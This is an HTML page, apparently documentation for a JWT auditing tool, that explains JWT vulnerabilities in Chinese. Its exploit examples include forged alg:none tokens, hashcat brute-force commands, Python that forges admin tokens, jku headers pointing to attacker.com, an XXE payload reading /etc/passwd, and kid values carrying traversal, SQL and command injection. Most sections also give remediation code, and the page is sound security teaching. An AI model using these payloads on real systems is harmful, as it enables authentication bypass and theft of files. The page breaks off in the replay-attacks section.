<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JWT漏洞指南 - JWTAuditor</title>
    <meta name="description" content="JWT安全漏洞、利用技术和缓解策略的综合指南。">
    <meta name="keywords" content="JWT, 安全, 漏洞, 算法none, 密钥混淆, 暴力破解">
    <link rel="stylesheet" href="../css/styles.css">
    <link rel="stylesheet" href="css/docs.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
    <link rel="icon" href="../img/logo.svg" type="image/svg+xml">
</head>
<body class="docs-body">
    <header>
        <div class="logo">
            <i class="fas fa-user-secret"></i>
            <h1>JWTAuditor</h1>
        </div>
        <div class="subtitle">文档与学习资源</div>
        <div class="header-actions">
            <a href="../index.html" class="header-btn tool-btn"><i class="fas fa-tools"></i> 返回工具</a>
        </div>
    </header>

    <main class="docs-main">
        <div class="docs-container">
            <aside class="docs-sidebar">
                <div class="sidebar-header">
                    <h2>文档</h2>
                </div>
                <nav class="docs-nav">
                    <div class="nav-section">
                        <h3>JWT基础</h3>
                        <ul>
                            <li><a href="jwt-fundamentals.html">理解JWT结构</a></li>
                            <li><a href="jwt-claims.html">JWT声明详解</a></li>
                            <li><a href="jwt-vs-sessions.html">JWT与会话认证</a></li>
                        </ul>
                    </div>
                    <div class="nav-section">
                        <h3>安全指南</h3>
                        <ul>
                            <li><a href="jwt-vulnerabilities-guide.html" class="active">JWT漏洞指南</a></li>
                            <li><a href="jwt-attack-vectors.html">完整攻击向量</a></li>
                            <li><a href="jwt-security-checklist.html">安全检查清单</a></li>
                            <li><a href="jwt-tools-comparison.html">工具对比</a></li>
                            <li><a href="secure-jwt-implementation.html">安全实施</a></li>
                            <li><a href="jwt-attack-techniques.html">攻击技术</a></li>
                        </ul>
                    </div>
                    <div class="nav-section">
                        <h3>工具指南</h3>
                        <ul>
                            <li><a href="tool-guides/decoder-analyzer.html">解码器与分析器</a></li>
                            <li><a href="tool-guides/secret-bruteforcer.html">密钥暴力破解器</a></li>
                            <li><a href="tool-guides/jwt-editor.html">JWT编辑器</a></li>
                            <li><a href="tool-guides/jwt-generator.html">JWT生成器</a></li>
                        </ul>
                    </div>
                    <div class="nav-section">
                        <h3>参考</h3>
                        <ul>
                            <li><a href="reference/jwt-header-parameters.html">头部参数</a></li>
                            <li><a href="reference/jwt-claim-registry.html">声明注册表</a></li>
                            <li><a href="reference/jwt-algorithms.html">JWT算法</a></li>
                        </ul>
                    </div>
                </nav>
            </aside>

            <div class="docs-content">
                <div class="docs-header">
                    <h1>JWT漏洞指南</h1>
                    <div class="docs-meta">
                        <span><i class="fas fa-user-secret"></i> 安全指南</span>
                        <span><i class="fas fa-clock"></i> Reading time: 15 min</span>
                    </div>
                </div>

                <div class="docs-section intro-section">
                    <p class="lead">
                        JSON Web Token（JWT）已成为在现代Web应用程序中实现身份验证和授权的事实标准。然而，它们的广泛采用也使其成为攻击者的主要目标。本指南探讨了常见的JWT漏洞、利用技术以及安全实现的最佳实践。
                    </p>
                    
                    <div class="warning-box">
                        <div class="warning-icon"><i class="fas fa-exclamation-triangle"></i></div>
                        <div class="warning-content">
                            <p><strong>重要提示：</strong> 本指南仅供教育目的。请负责任且道德地使用您的知识。切勿在未经明确许可的情况下尝试利用系统的漏洞。</p>
                        </div>
                    </div>
                </div>

                <div class="docs-section">
                    <h2>目录</h2>
                    <ul class="toc-list">
                        <li><a href="#algorithm-none">None算法攻击</a></li>
                        <li><a href="#symmetric-key">对称密钥暴力破解</a></li>
                        <li><a href="#algorithm-confusion">算法混淆攻击</a></li>
                        <li><a href="#jwk-injection">JWK头部注入</a></li>
                        <li><a href="#jku-injection">JWK集URL注入</a></li>
                        <li><a href="#kid-injection">密钥ID（kid）参数注入</a></li>
                        <li><a href="#arbitrary-signatures">接受任意签名</a></li>
                        <li><a href="#x5c-injection">X.509证书链注入</a></li>
                        <li><a href="#cty-manipulation">内容类型操纵</a></li>
                        <li><a href="#sensitive-data">敏感数据泄露</a></li>
                        <li><a href="#missing-claims">缺少或误用声明</a></li>
                        <li><a href="#replay-attacks">重放攻击</a></li>
                        <li><a href="#weak-secrets">弱密钥</a></li>
                        <li><a href="#token-invalidation">令牌失效问题</a></li>
                        <li><a href="#token-substitution">令牌替换攻击</a></li>
                    </ul>
                </div>

                <div id="algorithm-none" class="docs-section">
                    <h2>None算法攻击</h2>
                    
                    <h3>什么是这个问题？</h3>
                    <p>
                        JWT规范允许使用"alg"值为"none"来表示令牌是不安全的。一些JWT库可能接受"alg"头部设置为"none"的令牌并完全跳过签名验证。
                    </p>
                    
                    <h3>为什么危险？</h3>
                    <p>
                        如果服务器接受"alg"头部设置为"none"的令牌，攻击者就可以在不知道密钥的情况下伪造有效令牌，从而有效地绕过身份验证。
                    </p>
                    
                    <h3>如何利用它</h3>
                    <ol>
                        <li>解码现有JWT以访问其有效载荷</li>
                        <li>创建一个新的JWT，使用相同的有效载荷但将头部更改为 <code>{"alg": "none"}</code></li>
                        <li>将签名部分设置为空字符串</li>
                        <li>将修改后的令牌发送到服务器</li>
                    </ol>
                    
                    <pre><code class="language-text">// 原始令牌
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

// 使用"alg: none"修改的令牌
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.</code></pre>
                    
                    <h3>如何修复</h3>
                    <ol>
                        <li>在JWT验证代码中明确拒绝"alg: none"的令牌</li>
                        <li>使用默认不支持"none"算法的库</li>
                        <li>实现允许算法的白名单，而不是不允许算法的黑名单</li>
                    </ol>
                    
                    <pre><code class="language-javascript">// 在Node.js中使用jsonwebtoken库的示例
jwt.verify(token, secret, { 
  algorithms: ['HS256', 'RS256'] // 明确指定允许的算法
});</code></pre>
                </div>

                <div id="symmetric-key" class="docs-section">
                    <h2>对称密钥暴力破解</h2>
                    
                    <h3>什么是这个问题？</h3>
                    <p>
                        当JWT使用HMAC算法（HS256、HS384、HS512）签名时，它们依赖于共享密钥。如果此密钥很弱、可预测或熵值低，攻击者就可以暴力破解它。
                    </p>
                    
                    <h3>为什么危险？</h3>
                    <p>
                        一旦攻击者发现密钥，他们就可以：
                    </p>
                    <ul>
                        <li>创建具有任何他们想要的有效载荷的新令牌</li>
                        <li>修改现有令牌而不被检测到</li>
                        <li>冒充系统中的任何用户</li>
                        <li>将权限提升到管理员级别</li>
                    </ul>
                    
                    <h3>如何利用它</h3>
                    <ol>
                        <li>获取一个有效的JWT令牌</li>
                        <li>使用字典或暴力攻击来猜测密钥</li>
                        <li>常见的弱密钥包括："secret"、"password"、"123456"、公司名称等</li>
                        <li>使用像JWTAuditor密钥暴力破解器、hashcat或自定义脚本等工具</li>
                    </ol>
                    
                    <h4>使用Hashcat进行JWT密钥暴力破解</h4>
                    <p>Hashcat是暴力破解JWT密钥的最有效工具之一：</p>
                    
                    <pre><code class="language-bash"># JWT的基本hashcat命令（模式16500）
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# 使用优化的工作负载
hashcat -a 0 -m 16500 -w 3 jwt.txt wordlist.txt

# 显示破解结果
hashcat -a 0 -m 16500 jwt.txt wordlist.txt --show

# 使用流行的JWT密钥词表
wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt_auditor_potential_secrets.txt
hashcat -a 0 -m 16500 jwt.txt jwt_auditor_potential_secrets.txt</code></pre>
                    
                    <p>找到密钥时Hashcat的输出格式：</p>
                    <pre><code class="language-text">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c:secret</code></pre>
                    
                    <h4>要测试的常见弱密钥</h4>
                    <ul>
                        <li><code>secret</code></li>
                        <li><code>password</code></li>
                        <li><code>123456</code></li>
                        <li><code>jwt</code></li>
                        <li><code>your-256-bit-secret</code></li>
                        <li><code>HS256</code></li>
                        <li><code>default</code></li>
                        <li><code>admin</code></li>
                        <li><code>secretkey</code></li>
                        <li>公司名称或项目名称</li>
                        <li>来自文档的默认示例</li>
                    </ul>
                    
                    <h4>Other tools for JWT secret brute-forcing</h4>
                    <pre><code class="language-bash"># 使用jwt-cracker（Node.js工具）
npm install -g jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." "secret"

# 使用自定义Python脚本
python3 jwt_bruteforce.py --jwt "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." --wordlist wordlist.txt</code></pre>
                    
                    <h3>如何修复</h3>
                    <ul>
                        <li>使用至少256位（32字节）的加密安全随机密钥</li>
                        <li>永远不要使用字典词汇、可预测模式或与公司相关的术语</li>
                        <li>考虑使用非对称算法（RS256、ES256）代替</li>
                        <li>定期轮换密钥</li>
                        <li>使用环境变量或安全的密钥管理系统</li>
                    </ul>
                    
                    <pre><code class="language-javascript">// 好的：生成强密钥
const crypto = require('crypto');
const secret = crypto.randomBytes(32).toString('hex');

// 不好的：弱密钥
const secret = "secret";
const secret = "mycompany123";
const secret = "password";</code></pre>
                </div>

                <div id="algorithm-confusion" class="docs-section">
                    <h2>算法混淆攻击</h2>
                    
                    <h3>什么是这个问题？</h3>
                    <p>
                        算法混淆攻击利用了未正确验证令牌头部中指定算法的JWT实现。最常见的变体是从非对称算法（如RS256）切换到对称算法（如HS256）。
                    </p>
                    
                    <h3>为什么危险？</h3>
                    <p>
                        在典型的RS256设置中，服务器使用私钥签署令牌并使用公钥验证它们。如果攻击者可以将算法更改为HS256，服务器可能会使用公钥作为HMAC密钥，允许攻击者伪造有效令牌。
                    </p>
                    
                    <h3>如何利用它</h3>
                    <ol>
                        <li>获取使用RS256签名的JWT</li>
                        <li>提取或查找公钥（通常可在/.well-known/jwks.json获得）</li>
                        <li>将头部中的算法从RS256更改为HS256</li>
                        <li>使用HS256和公钥作为密钥签署令牌</li>
                        <li>将修改后的令牌发送到服务器</li>
                    </ol>
                    
                    <pre><code class="language-javascript">// 原始头部
{
  "alg": "RS256",
  "typ": "JWT"
}

// 修改后的头部
{
  "alg": "HS256",
  "typ": "JWT"
}

// 创建攻击令牌的Python示例
import jwt

# 从服务器提取的公钥
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# 创建恶意令牌
payload = {"sub": "admin", "role": "administrator"}
malicious_token = jwt.encode(payload, public_key, algorithm="HS256")</code></pre>
                    
                    <h3>如何修复</h3>
                    <ul>
                        <li>始终验证算法并拒绝意外的算法</li>
                        <li>使用算法白名单，而不是黑名单</li>
                        <li>确保您的JWT库执行严格的算法验证</li>
                        <li>为不同算法使用不同的密钥</li>
                    </ul>
                    
                    <pre><code class="language-javascript">// Node.js示例 - 安全验证
const jwt = require('jsonwebtoken');

try {
    const decoded = jwt.verify(token, publicKey, {
        algorithms: ['RS256'], // 仅允许RS256
        issuer: 'trusted-issuer',
        audience: 'my-service'
    });
} catch (err) {
    // 令牌无效
    console.error('令牌验证失败:', err.message);
}</code></pre>
                </div>

                <div id="jwk-injection" class="docs-section">
                    <h2>JWK头部注入</h2>
                    
                    <h3>什么是这个问题？</h3>
                    <p>
                        JSON Web Signature（JWS）规范允许一个可选的"jwk"头部参数，它可以将公钥直接嵌入令牌中的JWK格式。配置错误的服务器可能在接受此参数中提供的任何密钥时缺乏适当的验证。
                    </p>
                    
                    <h3>为什么危险？</h3>
                    <p>
                        如果服务器接受带有任意"jwk"头部参数的令牌，攻击者可以：
                    </p>
                    <ul>
                        <li>生成他们自己的RSA密钥对</li>
                        <li>使用他们的私钥签署恶意JWT</li>
                        <li>在"jwk"头部中嵌入相应的公钥</li>
                        <li>服务器将使用攻击者的公钥来验证签名</li>
                    </ul>
                    
                    <h3>攻击示例</h3>
                    <p>攻击者可能这样利用此漏洞：</p>
                    
                    <pre><code class="language-json">{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "attacker-key-123",
    "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m..."
  }
}</code></pre>
                    
                    <h3>如何修复</h3>
                    <ul>
                        <li>绝不接受来自JWT头部的任意密钥</li>
                        <li>使用受信任公钥的严格白名单</li>
                        <li>将受信任的密钥存储在服务器端，而不是在令牌中</li>
                        <li>如果使用"jwk"参数，请针对已知集合验证密钥</li>
                    </ul>
                    
                    <pre><code class="language-javascript">// Node.js示例 - 安全密钥验证
const trustedKeys = [
    { kid: 'key-1', key: fs.readFileSync('public-key-1.pem') },
    { kid: 'key-2', key: fs.readFileSync('public-key-2.pem') }
];

function getVerificationKey(header) {
    // 仅使用预配置的受信任密钥
    const trustedKey = trustedKeys.find(k => k.kid === header.kid);
    if (!trustedKey) {
        throw new Error('不受信任的密钥ID');
    }
    return trustedKey.key;
}</code></pre>
                </div>

                <div id="jku-injection" class="docs-section">
                    <h2>JWK Set URL Injection</h2>
                    
                    <h3>What is this issue?</h3>
                    <p>
                        The "jku" (JWK Set URL) header parameter allows servers to reference a JWK Set containing verification keys from a URL. If not properly validated, attackers can provide URLs pointing to their own malicious key sets.
                    </p>
                    
                    <h3>Why is it dangerous?</h3>
                    <p>
                        Vulnerable implementations may:
                    </p>
                    <ul>
                        <li>Fetch keys from attacker-controlled URLs</li>
                        <li>Accept malicious keys from untrusted sources</li>
                        <li>Be vulnerable to SSRF attacks</li>
                        <li>Allow attackers to bypass authentication entirely</li>
                    </ul>
                    
                    <h3>Example attack</h3>
                    <p>An attacker creates a malicious JWT with a "jku" header pointing to their server:</p>
                    
                    <pre><code class="language-json">{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/malicious-jwks.json",
  "kid": "attacker-key-1"
}</code></pre>
                    
                    <p>The malicious JWK Set on the attacker's server:</p>
                    
                    <pre><code class="language-json">{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key-1",
      "e": "AQAB",
      "n": "恶意密钥数据..."
    }
  ]
}</code></pre>
                    
                    <h3>如何修复</h3>
                    <ul>
                        <li>实施严格的URL验证和白名单</li>
                        <li>仅允许来自受信任域的JWK集URL</li>
                        <li>使用防止绕过的URL解析库</li>
                        <li>为无法访问的URL实施适当的错误处理</li>
                        <li>考虑完全禁用"jku"参数</li>
                    </ul>
                    
                    <pre><code class="language-javascript">// Node.js示例 - 安全JKU验证
const TRUSTED_DOMAINS = ['auth.company.com', 'keys.company.com'];

function validateJkuUrl(jku) {
    try {
        const url = new URL(jku);
        
        // 仅允许HTTPS
        if (url.protocol !== 'https:') {
            throw new Error('JKU必须使用HTTPS');
        }
        
        // 对照受信任域进行检查
        if (!TRUSTED_DOMAINS.includes(url.hostname)) {
            throw new Error('JKU域不受信任');
        }
        
        return true;
    } catch (error) {
        console.error('无效的JKU URL:', error.message);
        return false;
    }
}</code></pre>
                </div>

                <div id="arbitrary-signatures" class="docs-section">
                    <h2>接受任意签名</h2>
                    
                    <h3>什么是这个问题？</h3>
                    <p>
                        一些JWT实现根本没有正确验证签名。当开发人员混淆JWT解码方法和验证方法，或者签名验证意外被绕过时，就会发生这种情况。
                    </p>
                    
                    <h3>为什么危险？</h3>
                    <p>
                        没有适当的签名验证：
                    </p>
                    <ul>
                        <li>攻击者可以修改JWT有效载荷的任何部分</li>
                        <li>令牌完整性完全受损</li>
                        <li>身份验证和授权可以被绕过</li>
                        <li>可以注入任何任意声明</li>
                    </ul>
                    
                    <h3>常见的易受攻击模式</h3>
                    
                    <h4>1. 使用decode()而不是verify()</h4>
                    <pre><code class="language-javascript">// 易受攻击 - 无签名验证
const decoded = jwt.decode(token);
const userId = decoded.sub;

// 安全 - 适当的签名验证
const decoded = jwt.verify(token, secretKey);
const userId = decoded.sub;</code></pre>
                    
                    <h4>2. 错误地捕获验证错误</h4>
                    <pre><code class="language-javascript">// 易受攻击 - 即使验证失败也接受令牌
try {
    const decoded = jwt.verify(token, secretKey);
} catch (error) {
    // 尽管验证失败仍在处理令牌
    const decoded = jwt.decode(token);
    return decoded;
}</code></pre>
                    
                    <h4>3. 条件验证绕过</h4>
                    <pre><code class="language-python"># 易受攻击 - 在某些条件下绕过验证
def verify_token(token):
    if is_development_mode():
        return jwt.decode(token, options={"verify_signature": False})
    else:
        return jwt.decode(token, secret_key, algorithms=["HS256"])</code></pre>
                    
                    <h3>如何修复</h3>
                    <ul>
                        <li>始终使用适当的验证方法（verify()，而不是decode()）</li>
                        <li>永不绕过签名验证，即使在开发环境中</li>
                        <li>安全地处理验证错误</li>
                        <li>正确使用JWT库并遵循其文档</li>
                        <li>实施适当的错误处理，不要回退到不安全的方法</li>
                    </ul>
                </div>

                <div id="x5c-injection" class="docs-section">
                    <h2>X.509证书链注入</h2>
                    
                    <h3>什么是这个问题？</h3>
                    <p>
                        "x5c"（X.509证书链）头部参数可以包含X.509公钥证书。如果没有经过适当验证，攻击者可以注入自签名证书来绕过签名验证。
                    </p>
                    
                    <h3>为什么危险？</h3>
                    <p>
                        易受攻击的实现可能：
                    </p>
                    <ul>
                        <li>接受未经验证的自签名证书</li>
                        <li>信任头部中提供的任何证书</li>
                        <li>跳过适当的证书链验证</li>
                        <li>允许攻击者使用他们自己的证书签署令牌</li>
                    </ul>
                    
                    <h3>Example attack</h3>
                    <p>An attacker creates a self-signed certificate and includes it in the JWT header:</p>
                    
                    <pre><code class="language-json">{
  "alg": "RS256",
  "typ": "JWT",
  "x5c": [
    "MIICDTCCAXYCCQDFkjsdf...self-signed-cert...",
    "MIIBkTCB+wIBADBXMQswCQYDVQQGEwJVUzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDU..."
  ]
}</code></pre>
                    
                    <h3>How to fix it</h3>
                    <ul>
                        <li>Implement proper certificate validation</li>
                        <li>Verify certificates against trusted Certificate Authorities</li>
                        <li>Check certificate expiration dates</li>
                        <li>Validate the entire certificate chain</li>
                        <li>Use certificate pinning when possible</li>
                    </ul>
                    
                    <pre><code class="language-python"># Python example - secure certificate validation
import ssl
import certifi
from cryptography import x509
from cryptography.hazmat.backends import default_backend

def validate_x5c_certificates(x5c_header):
    try:
        # Parse the first certificate
        cert_der = base64.b64decode(x5c_header[0])
        cert = x509.load_der_x509_certificate(cert_der, default_backend())
        
        # Verify certificate is not self-signed
        if cert.issuer == cert.subject:
            raise ValueError("Self-signed certificates not allowed")
        
        # Verify certificate is not expired
        now = datetime.utcnow()
        if cert.not_valid_after < now:
            raise ValueError("Certificate has expired")
        
        # Additional validation logic...
        return cert.public_key()
        
    except Exception as e:
        raise ValueError(f"Certificate validation failed: {str(e)}")</code></pre>
                </div>

                <div id="cty-manipulation" class="docs-section">
                    <h2>Content Type Manipulation</h2>
                    
                    <h3>What is this issue?</h3>
                    <p>
                        The "cty" (Content Type) header parameter can declare the media type of the JWT payload. If signature verification is bypassed, attackers might manipulate this parameter to enable new attack vectors like XXE or deserialization attacks.
                    </p>
                    
                    <h3>Why is it dangerous?</h3>
                    <p>
                        Manipulating the content type can enable:
                    </p>
                    <ul>
                        <li>XML External Entity (XXE) attacks by setting cty to "text/xml"</li>
                        <li>Deserialization attacks with "application/x-java-serialized-object"</li>
                        <li>Other payload parsing vulnerabilities</li>
                        <li>Bypass of content-type based security controls</li>
                    </ul>
                    
                    <h3>Example attack</h3>
                    <p>After bypassing signature verification, an attacker might use:</p>
                    
                    <pre><code class="language-json">{
  "alg": "none",
  "typ": "JWT",
  "cty": "text/xml"
}</code></pre>
                    
                    <p>With a malicious XML payload:</p>
                    
                    <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;user&gt;
  &lt;name&gt;&amp;xxe;&lt;/name&gt;
  &lt;role&gt;admin&lt;/role&gt;
&lt;/user&gt;</code></pre>
                    
                    <h3>如何修复</h3>
                    <ul>
                        <li>始终正确验证JWT签名</li>
                        <li>不处理来自未经验证令牌的内容类型头部</li>
                        <li>使用严格的内容类型验证</li>
                        <li>为JWT有效载荷禁用XML处理</li>
                        <li>实施适当输入验证，无论内容类型如何</li>
                    </ul>
                    
                    <pre><code class="language-javascript">// Node.js示例 - 安全内容类型处理
function processJWT(token) {
    // 始终先验证签名
    const decoded = jwt.verify(token, secretKey);
    
    // 仅接受标准JSON有效载荷
    if (decoded.header.cty && decoded.header.cty !== 'application/json') {
        throw new Error('不支持的内容类型');
    }
    
    // 处理已验证的有效载荷
    return decoded.payload;
}</code></pre>
                </div>

                <div id="sensitive-data" class="docs-section">
                    <h2>敏感数据泄露</h2>
                    
                    <h3>什么是这个问题？</h3>
                    <p>
                        JWT默认情况下是编码（Base64URL）而不是加密的。任何拥有令牌的人都可以轻松读取有效载荷。开发人员有时会错误地在JWT有效载荷中包含敏感信息。
                    </p>
                    
                    <h3>为什么危险？</h3>
                    <p>
                        JWT有效载荷中的敏感数据可能会被：
                    </p>
                    <ul>
                        <li>任何有权访问令牌的人查看</li>
                        <li>记录在服务器日志、浏览器历史记录或网络流量中</li>
                        <li>如果存储在localStorage中，通过XSS攻击暴露</li>
                        <li>意外地在URL或错误消息中分享</li>
                    </ul>
                    
                    <h3>敏感数据示例</h3>
                    <ul>
                        <li>密码或密码哈希</li>
                        <li>社会安全号码</li>
                        <li>信用卡信息</li>
                        <li>个人识别号码</li>
                        <li>内部系统信息</li>
                        <li>数据库连接字符串</li>
                    </ul>
                    
                    <pre><code class="language-json">// 不好：JWT中的敏感数据
{
  "sub": "user123",
  "name": "John Doe",
  "ssn": "123-45-6789",
  "password": "hashedpassword123",
  "api_key": "secret-api-key-xyz",
  "salary": 75000,
  "credit_card": "4111-1111-1111-1111"
}</code></pre>
                    
                    <h3>How to fix it</h3>
                    <ul>
                        <li>Never include sensitive data in JWT payloads</li>
                        <li>Use minimal claims (only what's necessary for authorization)</li>
                        <li>Store sensitive data on the server, reference it by ID in the token</li>
                        <li>Use JWE (JSON Web Encryption) for confidential data</li>
                        <li>Audit your JWT payloads regularly</li>
                    </ul>
                    
                    <pre><code class="language-json">// GOOD: Minimal, non-sensitive claims
{
  "sub": "user123",
  "role": "user",
  "permissions": ["read", "write"],
  "exp": 1516242622,
  "iat": 1516239022
}</code></pre>
                </div>

                <div id="missing-claims" class="docs-section">
                    <h2>缺少或误用声明</h2>
                    
                    <h3>什么是这个问题？</h3>
                    <p>
                        JWT提供多个标准声明（exp、iat、nbf、aud、iss、sub、jti），有助于确保令牌被正确使用。缺少或验证不当的声明可能导致安全漏洞。
                    </p>
                    
                    <h3>常见的缺失声明及其风险</h3>
                    
                    <h4>1. 缺少过期时间（exp）</h4>
                    <ul>
                        <li>令牌永远不会过期，造成无限期访问</li>
                        <li>受损的令牌将永久有效</li>
                        <li>没有强制重新身份验证的机制</li>
                    </ul>
                    
                    <h4>2. 缺少受众（aud）</h4>
                    <ul>
                        <li>跨不同服务的令牌替换攻击</li>
                        <li>为一个服务设计的令牌可在另一个服务上使用</li>
                        <li>缺乏特定服务的验证</li>
                    </ul>
                    
                    <h4>3. 缺少签发者（iss）</h4>
                    <ul>
                        <li>无法验证哪个服务创建了令牌</li>
                        <li>可能接受来自不可信源的令牌</li>
                        <li>难以追踪令牌来源</li>
                    </ul>
                    
                    <h4>4. 缺少不早于（nbf）</h4>
                    <ul>
                        <li>令牌可在预期激活时间之前使用</li>
                        <li>提前使用令牌</li>
                    </ul>
                    
                    <h3>如何修复</h3>
                    <ul>
                        <li>始终包含过期时间（exp）声明</li>
                        <li>设置适当的过期时间（访问令牌为15-30分钟）</li>
                        <li>包含受众（aud）声明并验证它们</li>
                        <li>包含签发者（iss）声明并验证它们</li>
                        <li>使用签发时间（iat）声明处理时钟偏差</li>
                        <li>包含JWT ID（jti）用于令牌撤销功能</li>
                    </ul>
                    
                    <pre><code class="language-javascript">// 完整的令牌验证
const jwt = require('jsonwebtoken');

const options = {
    issuer: 'trusted-auth-server',
    audience: 'my-api-service',
    expiresIn: '15m',
    algorithm: 'RS256'
};

try {
    const decoded = jwt.verify(token, publicKey, options);
    
    // 附加验证
    if (!decoded.sub) {
        throw new Error('缺少主题声明');
    }
    
    if (!decoded.iat) {
        throw new Error('缺少签发时间声明');
    }
    
    // 检查时钟偏差
    const now = Math.floor(Date.now() / 1000);
    const clockSkew = 60; // 允许60秒的时钟偏差
    
    if (decoded.iat > now + clockSkew) {
        throw new Error('令牌在签发前使用');
    }
    
} catch (err) {
    console.error('令牌验证失败:', err.message);
}</code></pre>
                </div>

                <div id="kid-injection" class="docs-section">
                    <h2>密钥ID（kid）参数注入</h2>
                    
                    <h3>什么是这个问题？</h3>
                    <p>
                        JWT头部中的"kid"（密钥ID）参数指定应用于验证的密钥。服务器可能使用此参数从数据库、文件系统或JWK集识别正确的密钥。如果没有经过适当验证，攻击者可以操纵此参数利用各种漏洞。
                    </p>
                    
                    <h3>Why is it dangerous?</h3>
                    <p>
                        Attackers can manipulate the "kid" parameter to:
                    </p>
                    <ul>
                        <li>Exploit directory traversal vulnerabilities</li>
                        <li>Access arbitrary files from the server's filesystem</li>
                        <li>Force the use of predictable or empty keys</li>
                        <li>Exploit SQL injection vulnerabilities</li>
                        <li>Reference keys they control</li>
                    </ul>
                    
                    <h3>Common attack scenarios</h3>
                    
                    <h4>1. Directory Traversal Attack</h4>
                    <p>If the server uses the "kid" parameter to reference files, attackers can use directory traversal to access other files:</p>
                    <pre><code class="language-json">{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../etc/passwd"
}</code></pre>
                    
                    <h4>2. 空密钥攻击（/dev/null）</h4>
                    <p>最有效的攻击之一是指向可预测的空文件，如/dev/null的"kid"参数：</p>
                    <pre><code class="language-json">{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../dev/null"
}</code></pre>
                    <p>由于/dev/null是空的，服务器将使用空字符串作为签名密钥。攻击者随后可以使用空字符串签署他们的恶意JWT。</p>
                    
                    <h4>3. SQL注入</h4>
                    <p>如果"kid"参数在SQL查询中使用而没有适当的清理：</p>
                    <pre><code class="language-json">{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1' UNION SELECT 'attack-key' FROM users WHERE admin=1--"
}</code></pre>
                    
                    <h4>4. 命令注入</h4>
                    <pre><code class="language-json">{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1; cat /etc/passwd"
}</code></pre>
                    
                    <h4>5. URL操纵</h4>
                    <pre><code class="language-json">{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "http://attacker.com/malicious-key"
}</code></pre>
                    
                    <h3>实际利用示例</h3>
                    <p>攻击者可能这样利用/dev/null技术：</p>
                    
                    <pre><code class="language-bash"># 步骤1：创建以/dev/null为kid的恶意JWT
# 头部: {"alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null"}
# 有效载荷: {"sub": "admin", "role": "admin", "exp": 1999999999}

# 步骤2：使用空字符串作为密钥签署JWT
import jwt
payload = {"sub": "admin", "role": "admin", "exp": 1999999999}
malicious_token = jwt.encode(payload, "", algorithm="HS256")

# 步骤3：使用恶意令牌绕过身份验证</code></pre>
                    
                    <h3>如何修复</h3>
                    <ul>
                        <li>为"kid"值实施严格的白名单验证</li>
                        <li>在密钥ID中仅使用字母数字字符和下划线</li>
                        <li>切勿在文件路径或SQL查询中直接使用"kid"参数</li>
                        <li>将密钥存储在无法通过路径遍历访问的安全位置</li>
                        <li>如果将密钥存储在数据库中，请使用参数化查询</li>
                        <li>实施适当的输入验证和清理</li>
                        <li>使用允许密钥ID的白名单</li>
                        <li>避免在"kid"值中直接使用文件路径</li>
                        <li>为数据库查找使用参数化查询</li>
                        <li>实施适当的输入验证</li>
                    </ul>
                    
                    <pre><code class="language-javascript">// 安全kid验证
function validateKid(kid) {
    // 允许密钥ID的白名单
    const allowedKids = ['key1', 'key2', 'key3', 'production-key'];
    
    if (!allowedKids.includes(kid)) {
        throw new Error('无效的密钥ID');
    }
    
    // 附加验证
    if (kid.includes('..') || kid.includes('/') || kid.includes('\\')) {
        throw new Error('无效的密钥ID格式');
    }
    
    return kid;
}

// 用法
try {
    const header = jwt.decode(token, { complete: true }).header;
    const validKid = validateKid(header.kid);
    const key = getKeyById(validKid);
    const decoded = jwt.verify(token, key);
} catch (err) {
    console.error('令牌验证失败:', err.message);
}</code></pre>
                </div>

                <div id="replay-attacks" class="docs-section">
                    <h2>重放攻击</h2>
                    
                    <h3>什么是这个问题？</h3>
                    <p>
                        当攻击者捕获有效JWT并重复使用以获得未授权访问时，会发生重放攻击。当令牌有过长的过期时间或没有跟踪令牌使用的机制时，这尤其危险。
                    </p>
                    
                    <h3>为什么危险？</h3>
                    <p>
                        重放攻击可能导致：
                    </p>
                    <ul>
                        <li>用户注销后的未授权访问</li>
                        <li>会话劫持</li>
                        <li>即使更改密码后仍保持持久访问</li>
                        <li>特权操作的滥用</li>
                    </ul>
                    
                    <h3>攻击场景</h3>
                    <ol>
